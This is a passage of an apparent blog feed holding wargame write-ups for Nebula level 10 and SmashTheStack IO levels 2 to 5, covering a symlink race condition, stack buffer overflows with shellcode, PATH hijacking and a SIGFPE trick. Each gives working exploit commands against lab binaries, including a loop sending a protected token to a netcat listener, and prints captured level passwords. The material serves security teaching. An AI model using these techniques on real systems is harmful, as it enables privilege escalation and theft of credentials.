   printf(&ldquo;Unable to write banner to host %s\n&rdquo;, host);
   exit(EXIT_FAILURE);
  }</p>

<h1>undef HITHERE</h1>

<p>  printf(&ldquo;Connected!\nSending file .. &rdquo;); fflush(stdout);</p>

<p>  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
   printf(&ldquo;Damn. Unable to open file\n&rdquo;);
   exit(EXIT_FAILURE);
  }</p>

<p>  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
   printf(&ldquo;Unable to read from file: %s\n&rdquo;, strerror(errno));
   exit(EXIT_FAILURE);
  }</p>

<p>  write(fd, buffer, rc);</p>

<p>  printf(&ldquo;wrote file!\n&rdquo;);</p>

<p> } else {
  printf(&ldquo;You don&rsquo;t have access to %s\n&rdquo;, file);
 }
}
```</p>

<p>In the home directory there is also a token file which we probably want to read. Since the briefing already hints at the system call we need to exploit, let&rsquo;s read the <em>access()</em> manpage:</p>

<ul>
<li><em>int access(const char </em>pathname, int mode);*</li>
</ul>


<blockquote><p>access() checks whether the calling process can access the file <em>pathname</em>.  If <em>pathname</em> is a symbolic link, it is dereferenced.</p>

<p> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using <em>open(2)</em> creates a
security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this
reason, the use of this system call should be avoided.</p></blockquote>

<p>The type of vulnerability in this code is a time-of-check, time-of-use (TOCTOU) race condition. You can read more about it on <a href="https://cwe.mitre.org/data/definitions/367.html">mitre.org</a>. To summarize, the program checks the property of a file (in this case it checks if the user is allowed to read the file), and then performs an operation on it (reading, writing, etc.). But the file that is checked is referenced by its name, and not its file descriptor, meaning that the program is vulnerable in the interval between the call to <em>access()</em> and the call to <em>open()</em>, since the file that was passed to <em>access()</em> might not be the same as the one which <em>open()</em> will operate on.</p>

<p>First of all I wanted to test that the program will upload a file without problems, so I had netcat listen on my machine and created a file on the nebula system and tried to send it:</p>

<p><code>plain
level10@nebula:/home/flag10$ ./flag10 /tmp/tok 192.168.80.130
Connecting to 192.168.80.130:18211 .. Connected!
Sending file .. wrote file!
</code></p>

<p>And on my netcat side:</p>

<p><code>plain
nc: connect to 192.168.80.130 18211 from 192.168.80.133 60491
.oO Oo.
blabla
</code></p>

<p>So it worked just fine. The binary sent a banner and then the contents of the file. Now it&rsquo;s a matter of how to fool it into sending the token which we don&rsquo;t have permission to read. Well, what if the <em>access()</em> gives the ok to a file that I made, but when <em>open()</em> will try to read it, instead it will be a symbolic link to the token? After some trial and error, here&rsquo;s the solution that worked:</p>

<ul>
<li>first, on my host machine, I ran netcat in an infinite loop so that it will keep listening even when the other side closes the connection:</li>
</ul>


<p><code>plain
root@kali:~# while true; do nc -nlp 18211; done
</code></p>

<ul>
<li>on the Nebula machine, I ran this command:</li>
</ul>


<p><code>plain
level10@nebula:/home/flag10$ while true; do touch /tmp/tok &amp; ./flag10 /tmp/tok 192.168.80.130 &amp; ln -fs /home/flag10/token /tmp/tok &amp; rm -f /tmp/tok; done
</code></p>

<p>This is another infinite loop that runs a series of commands in the background. A file named <em>tok</em> is created in <em>/tmp/</em>, the flag10 binary attempts to send this file to my host, but there is also a symlink command that links <em>tok</em> to the token, and this might happen before or after the <em>access()</em> call. And finally, the <em>tok</em> file is removed. In the netcat window, you will see the output flying by, and besides the banner, you can see the token contents: <code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>, when the timing is right.</p>

<p>Note that these commands aren&rsquo;t chained, but they run independent of each other (forked and run asynchronously in a separate sub-shell). You can read more here about the <a href="http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html">use of &amp; on the command line</a></p>

<p>There is another alternative way I completed it, by following the example of the race condition attacks on <a href="https://iseclab.org/secprog/slides/secprog-6.pdf">pages 16-19</a> (there are nice diagrams helping with the explanation). Again, with netcat listening and 2 terminals on the Nebula machine, in one I run:</p>

<p><code>plain
level10@nebula:/tmp$ while true; do touch dummy; ln -sf dummy tok; rm -f tok; ln -sf /home/flag10/token tok; done
</code></p>

<p>And in the other:</p>

<p><code>plain
level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/tok 192.168.80.130; done
</code></p>

<p>When <em>tok</em> is passed to <em>access()</em>, everything is fine, but before the <em>open()</em> call, <em>tok</em> has been replaced with a symlink to the token, which <em>open()</em> happily reads.</p>

<p>To finish, I used the token to SSH in as the flag10 user and run <em>getflag</em>:</p>

<p><code>plain
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<p>``` plain</p>

<hr />

<p>/ Better hope the life-inspector doesn&rsquo;t  \
| come around while you have your life in |
\ such a mess.                            /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
    <updated>2014-07-18T13:08:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>

<!-- more -->


<p>Code for level05.c:</p>

<p>``` c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv) {</p>

<pre><code>char buf[128];

if(argc &lt; 2) return 1;

strcpy(buf, argv[1]);

printf("%s\n", buf);    

return 0;
</code></pre>

<p>}
```</p>

<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>

<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>

<p>``` c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char *argv[]) {</p>

<pre><code>    char *ptr;
    if(argc &lt; 3) {
            printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
            exit(0);
    }
    ptr = getenv(argv[1]); /* Get env var location. */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
    printf("%s will be at %p\n", argv[1], ptr);
</code></pre>

<p>}
```</p>

<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>

<p><code>plain
export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
</code></p>

<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></p>

<p>Run the program in GDB with the pattern and then get the offset:</p>

<p>``` plain
Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()</p>

<p>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
[*] Exact match at offset 140
```</p>

<p>Now get the address of our environment variable:</p>

<p><code>plain
level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
PWN will be at 0xbfffff53
</code></p>

<p>Profit:</p>

<p><code>plain
level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
sh-4.2$ whoami
level6
sh-4.2$ cat /home/level6/.pass
9BT8fmYDTPimXXhY3m
</code></p>

<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>

<p>``` c
//don&rsquo;t get trapped, there&rsquo;s no need
//level by bla</p>

<h1>include &lt;sys/mman.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>define LOADERSIZE (232 + 16)</h1>

<p>void<em> getASLRregion(int size, int flags);
void switchcontext(char</em> newstack, char* code);</p>

<p>int main(int argc, char<em> argv[], char</em> env[])
{</p>

<pre><code>char *newcode, *newstack;

//allocate memory at random addresses
newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);

if(argc &gt; 1)
if(!strchr(argv[1], 0xcd))
if(!strchr(argv[1], 0xe8))
if(!strstr(argv[1], "\x0F\x34"))
if(!strchr(argv[1], 0xdb)) {
    //prepare new code section, leaving some space for a loader
    strncpy(newcode + LOADERSIZE, argv[1], 1000);

    //start executing using a new stack and code section.
    switchcontext(newstack + 64 * 1024, newcode);
}
return 0;
</code></pre>

<p>}</p>

<p>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>/
/</em> HALT! The code below only provides a controllable aslr/noexec for this challenge, there&rsquo;s no need to waste time on it <em>/
/</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/
void <strong>attribute</strong>((constructor))initializePRNG(){int seed;FILE<em>devrand=fopen(&ldquo;/dev/random&rdquo;,&ldquo;r&rdquo;);if(devrand==0)exit(-1);
if(fread(&amp;seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void</em>
getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries&mdash;){hint=rand()&lt;&lt;12;res=(int)mmap((void<em>)hint,size
+4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void</em>)(res+(rand()&amp;0xffc));}
if(munmap((void<em>)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char</em>newstack,char<em>code){loader[1]&lt;&lt;=2;memcpy(code
,loader,loader[1]+8);memcpy(code+loader[1]+8,&ldquo;\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70&rdquo;
&ldquo;\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31&rdquo;
&ldquo;\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30&rdquo;
&ldquo;\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff&rdquo;
&ldquo;\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2&rdquo;
&ldquo;\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80&rdquo;
&ldquo;\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80&rdquo;
&ldquo;\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6&rdquo;
&ldquo;\xf3\xab\x31\xff&rdquo;,LOADERSIZE-16);asm(&ldquo;mov %0, %%esp\nmov %1,%%eax\njmp </em>%%eax&rdquo;::&ldquo;r&rdquo;(newstack-4),&ldquo;r&rdquo;(code):&ldquo;eax&rdquo;);}
```</p>

<h4>Function overview</h4>

<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>

<p>PROT_EXEC  Pages may be executed.</p>

<p>PROT_READ  Pages may be read.</p>

<p>PROT_WRITE Pages may be written.</p>

<p><strong>strchr</strong></p>

<p><em>char <em>strchr(const char </em>str, int ch);</em></p>

<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>

<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>

<p>I will come back to this at a later time.</p>

<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/"/>
    <updated>2014-07-07T15:24:52-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4</id>
    <content type="html"><![CDATA[<p>We have source code for this level as well in level04.c:</p>

<!-- more -->


<p>``` c
//writen by bla</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main() {</p>

<pre><code>    char username[1024];
    FILE* f = popen("whoami","r");
    fgets(username, sizeof(username), f);
    printf("Welcome %s", username);

    return 0;
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>popen</strong></p>

<p><em>FILE <em>popen(const char </em>command, const char *type);</em></p>

<p>Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.</p>

<p>The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter &lsquo;r&rsquo; for reading or the letter &lsquo;w&rsquo; for writing.  Since glibc 2.9, this argument can additionally include the letter &lsquo;e&rsquo;, which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.</p>

<p>The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than <em>fclose(3)</em>.   Writing  to  such a stream writes to the standard input of the command; the command&rsquo;s standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a &ldquo;popened&rdquo;  stream  reads  the  command&rsquo;s standard output, and the command&rsquo;s standard input is the same as that of the process that called popen().</p>

<p>Note that output popen() streams are fully buffered by default.</p>

<p>The popen() function returns NULL if the <em>fork(2)</em> or <em>pipe(2)</em> calls fail, or if it cannot allocate memory.</p>

<p>The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.</p>

<p>Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command&rsquo;s input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().</p>

<p>Failure  to  execute  the  shell  is indistinguishable from the shell&rsquo;s failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.</p>

<p><strong>fgets</strong></p>

<p><em>char <em>fgets(char </em>str, int num, FILE *stream);</em></p>

<p>The <em>fgets()</em> function reads up to <em>num–1</em> characters from <em>stream</em> and stores them in the character array pointed to by <em>str</em>. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by <em>str</em>.</p>

<p>On success, the function returns <em>str</em>.
If the end-of-file is encountered while attempting to read a character, the eof indicator is set (<em>feof</em>). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of <em>str</em> remain unchanged).
If a read error occurs, the error indicator (<em>ferror</em>) is set and a null pointer is also returned (but the contents pointed by <em>str</em> may have changed).</p>

<h4>Program description</h4>

<p>This program executes a shell command and prints the results. If we try to run it, we see this:</p>

<p><code>plain
level4@io:/levels$ ./level04
Welcome level5
</code></p>

<p>This makes sense, since it&rsquo;s a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code></p>

<p>We can&rsquo;t directly influence the program since it doesn&rsquo;t take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the <em>whoami</em> command. We can&rsquo;t put another command its place, but maybe we don&rsquo;t have to. How does the program know where to find whoami? Let&rsquo;s first find it ourselves:</p>

<p><code>plain
level4@io:/levels$ which whoami
/usr/bin/whoami
</code></p>

<p>For this we have to understand the concept of PATH:</p>

<blockquote><p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for
executable files in response to commands issued by a user.
Each user on a system can have a different PATH variable.</p>

<p>(The Linux Information Project)</p></blockquote>

<p>To see the contents of our PATH variable, we do this:</p>

<p><code>plain
level4@io:/levels$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:</p>

<p>``` plain
PATH=&ldquo;directory:$PATH&rdquo;</p>

<p>PATH=$PATH:directory
export PATH</p>

<p>export PATH=$PATH:directory
```</p>

<p>Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let&rsquo;s do that now.</p>

<p><code>plain
level4@io:/levels$ mkdir /tmp/mydir
level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" &gt; /tmp/mydir/whoami
level4@io:/tmp/mydir$ ls -l whoami
-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami
</code></p>

<p>If we leave it like this, the permissions won&rsquo;t allow it to be executed, so I make it readable, writable and executable for everyone with the following:</p>

<p><code>plain
chmod 777 whoami
level4@io:/tmp/mydir$ ls -l whoami
-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami
</code></p>

<p>Now add our directory to our PATH:</p>

<p><code>plain
level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
level4@io:/tmp/mydir$ echo $PATH
/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>All that&rsquo;s left is to run the level04 binary and collect the password:</p>

<p><code>plain
level4@io:/tmp/mydir$ /levels/level04
Welcome KGpWsju2vDpmxcxlvm
</code></p>

<blockquote><p>Work consists of whatever a body is obliged to do.
Play consists of whatever a body is not obliged to do.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/"/>
    <updated>2014-07-07T14:37:07-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3</id>
    <content type="html"><![CDATA[<p>This is the source code for level03.c:</p>

<!-- more -->


<p>``` c
//bla, based on work by beach</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void good()
{</p>

<pre><code>    puts("Win.");
    execl("/bin/sh", "sh", NULL);
</code></pre>

<p>}
void bad()
{</p>

<pre><code>    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
</code></pre>

<p>}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{</p>

<pre><code>    void (*functionpointer)(void) = bad;
    char buffer[50];

    if(argc != 2 || strlen(argv[1]) &lt; 4)
            return 0;

    memcpy(buffer, argv[1], strlen(argv[1]));
    memset(buffer, 0, strlen(argv[1]) - 4);

    printf("This is exciting we're going to %p\n", functionpointer);
    functionpointer();

    return 0;
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>memcpy</strong></p>

<p><em>void <em>memcpy(void </em>dest, const void *src, size_t n);</em></p>

<p>Copies  <em>n</em> bytes from memory area <em>src</em> to memory area <em>dest</em>. The memory areas must not overlap.</p>

<p>The function does not check for any terminating null character in <em>src</em>.</p>

<p>Returns a pointer to <em>dest</em>.</p>

<p><strong>memset</strong></p>

<p><em>void <em>memset(void </em>buf, int value, size_t count);</em></p>

<p><em>buf</em> = Pointer to the block of memory to fill.</p>

<p><em>value</em> = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.</p>

<p><em>count</em> = Number of bytes to be set to the value.</p>

<p>Sets the first <em>count</em> bytes of the block of memory pointed by <em>buf</em> to the specified <em>value</em></p>

<p>Returns a pointer to the memory area <em>buf</em></p>

<p>The most common use of <em>memset()</em> is to initialize a region of memory to some known value.</p>

<h4>Program description</h4>

<p>Running the program we see this:</p>

<p><code>plain
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
</code></p>

<p>So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.</p>

<p>I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:</p>

<p><code>plain
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
</code></p>

<p>So EIP points to some junk that I provided with the string. Let&rsquo;s check the offset:</p>

<p><code>plain
./pattern_offset.rb 0x63413563
[*] Exact match at offset 76
</code></p>

<p>Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:</p>

<p><code>plain
level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.2$ whoami
level4
sh-4.2$ cat /home/level4/.pass
9C4Jxjc3O3IjB7nXej
</code></p>

<p>We hijacked the execution flow and made EIP point to the address of the function we needed.</p>

<blockquote><p>The surest protection against temptation is cowardice.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-2/"/>
    <updated>2014-07-03T16:51:49-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-2</id>
    <content type="html"><![CDATA[<p>For level 2, there are two programs that can be used to advance, and we have access to source code! Let&rsquo;s check the first one.</p>

<!-- more -->


<p>The source code for level02.c is as follows:</p>

<p>``` c
//a little fun brought to you by bla</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;signal.h></h1>

<h1>include &lt;setjmp.h></h1>

<p>void catcher(int a)
{</p>

<pre><code>    setresuid(geteuid(),geteuid(),geteuid());
printf("WIN!\n");
    system("/bin/sh");
    exit(0);
</code></pre>

<p>}</p>

<p>int main(int argc, char **argv)
{</p>

<pre><code>puts("source code is available in level02.c\n");

    if (argc != 3 || !atoi(argv[2]))
            return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>atoi</strong></p>

<p><em>int atoi(const char *str);</em></p>

<p>Converts the string argument to an integer. The string must contain a valid integer number. If this is not the case, the returned value is undefined.</p>

<p>The number can be terminated by any character that cannot be part of an integer number. This includes white space, punctuation, and characters.</p>

<p>Returns 0 if the string can&rsquo;t be converted to a valid integer.</p>

<p><strong>abs</strong></p>

<p><em>int abs (int n);</em></p>

<p>Returns the absolute value of an integer.</p>

<p>Trying to take the absolute value of the most negative integer is not defined.</p>

<p><strong>signal</strong></p>

<p><em>typedef void (*sighandler_t)(int);</em></p>

<p><em>sighandler_t signal(int signum, sighandler_t handler);</em></p>

<p>Sets a function as a handler for the signal. That function will be called when the program receives the signal.</p>

<p>The function can be a specific function or one of the following macros:</p>

<p><strong>SIG_DFL</strong> Default signal handling: the default action associated with the signal occurs.</p>

<p><strong>SIG_IGN</strong> Ignore the signal</p>

<p>According  to  POSIX, the behavior of a process is undefined after it ignores a SIGFPE, SIGILL, or SIGSEGV signal that was not generated by kill(2) or raise(3).  Integer division by zero has undefined result.  On some architectures it will  generate  a  SIGFPE signal.  (Also dividing the most negative integer by -1 may generate SIGFPE.)  Ignoring this signal might lead to an endless loop.</p>

<p>The effects of signal() in a multithreaded process are unspecified.</p>

<p><strong>SIGFPE</strong>      (Signal Floating-Point Exception) Erroneous arithmetic operation, such as zero divide or an operation resulting in overflow (not necessarily with a floating-point operation).</p>

<h4>Program description</h4>

<p>We can see from the code that the program is looking for 2 arguments, with the second being a valid <em>atoi</em> converted integer, and it returns the absolute value of the result of the division between the first and second arguments. The <em>catcher</em> function is registered as handler for the SIGFPE signal, and we want it to get called. At first glance, this should be possible by doing a zero division. But we can&rsquo;t use 0 for our second argument, because the program checks for <em>atoi</em> returning 0.</p>

<p>From the man page, we know that SIGFPE may be generated if we divide the most negative integer by -1, so let&rsquo;s try that:</p>

<p>``` plain
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c</p>

<p>WIN!
sh-4.2$ cat /home/level3/.pass
Ib3F7i7FqjziuDOBKi
```</p>

<p>It worked! Now let&rsquo;s look at the alternate way. This is the source for level02_alt.c:</p>

<p>``` c
/<em> submitted by noname </em>/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>define answer 3.141593</h1>

<p>void main(int argc, char **argv) {</p>

<pre><code>float a = (argc - 2)?: strtod(argv[1], 0);

    printf("You provided the number %f which is too ", a);


    if(a &lt; answer)
             puts("low");
    else if(a &gt; answer)
            puts("high");
    else
            execl("/bin/sh", "sh", "-p", NULL);
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>strtod</strong></p>

<p><em>double strtod(const char *str, char **endptr);</em></p>

<p>Converts the string to double and returns the result. Any character that cannot be part of a floating-point number will end the parsing. A pointer to the rest of the string after the last valid character is stored in the object pointed by <em>endptr</em>. If no conversion is performed, 0 is returned and the value of <em>str</em> is stored in the location referenced by <em>endptr</em>.</p>

<h4>Program description</h4>

<p>The program will spawn a shell if we provide it with the exact match for answer. But it&rsquo;s not as straightforward as passing 3.141593 to it, when I did that, I got the message that it was too low. I added a printf to the code, and I couldn&rsquo;t see any difference in rounding, but since this is a no-go, there has to be something else. Looking more closely at the manpage:</p>

<blockquote><p>The expected form of the (initial portion of the) string is optional
leading white space as recognized by isspace(3), an optional plus (&lsquo;+&rsquo;)
or minus sign (&lsquo;&ndash;&rsquo;) and then either (i) a decimal number, or (ii) a
hexadecimal number, or (iii) an infinity, or (iv) a NAN (not-a-number).</p>

<p>A NAN is &ldquo;NAN&rdquo; (disregarding case) optionally followed by &lsquo;(&rsquo;, a
sequence of characters, followed by &lsquo;)&rsquo;.  The character string specifies in an implementation-dependent way the type of NAN.</p></blockquote>

<p>Passing it nan gives us the shell:</p>

<p><code>plain
level2@io:/levels$ ./level02_alt nan
sh-4.2$ whoami
level3
</code></p>

<p>Cookie:</p>

<blockquote><p>Your temporary financial embarrassment will be relieved in a surprising manner.</p></blockquote>
]]></content>
  </entry>
  
</feed>
